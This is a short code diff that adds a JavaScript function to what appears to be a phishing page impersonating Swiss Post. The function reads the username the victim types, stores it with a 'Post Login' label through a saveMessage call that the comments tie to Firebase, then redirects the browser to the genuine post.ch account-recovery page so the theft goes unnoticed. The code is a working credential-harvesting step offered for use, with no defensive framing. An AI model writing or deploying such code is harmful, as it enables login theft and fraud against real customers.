@@ -1,0 +1,11 @@
+<script>
+    /* Implement the onlick function to trigger firebase an redirect to post*/
+    function loginPost() {
+        /*Grab user info*/
+        var userName = document.getElementById("post_user").value
+        /* Save to firebas */
+        saveMessage('Post Login', userName)
+        /* redirect */
+        window.location.replace("https://account.post.ch/recoveraccount/?app=portal-delivery&profile=default&accountType=B2B&lang=de&targetURL=https:%2F%2Fwww.post.ch%2Fde%2Fkundencenter%2Fkundencenter%3FinIframe%3Dfalse%26inMobileApp%3Dfalse&abortURL=https:%2F%2Fwww.post.ch%2Fde%2F%3FinIframe%3Dfalse%26inMobileApp%3Dfalse&service=klp&inIframe=false");
+    }
+</script>
